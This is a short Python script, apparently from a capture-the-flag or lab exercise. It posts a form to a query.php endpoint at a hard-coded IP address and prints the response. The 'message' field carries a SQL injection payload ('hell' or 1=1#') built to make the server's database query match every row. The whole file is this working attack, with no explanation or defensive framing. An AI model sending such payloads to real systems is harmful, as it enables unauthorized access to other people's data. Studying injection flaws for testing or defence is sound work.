#!/usr/bin/python
# coding: utf-8

import requests

url = "http://223.194.105.184:9180/query.php"

data = {
		'to':'hello',
		'message': "hell' or 1=1#"
		}
print requests.post(url, data=data).content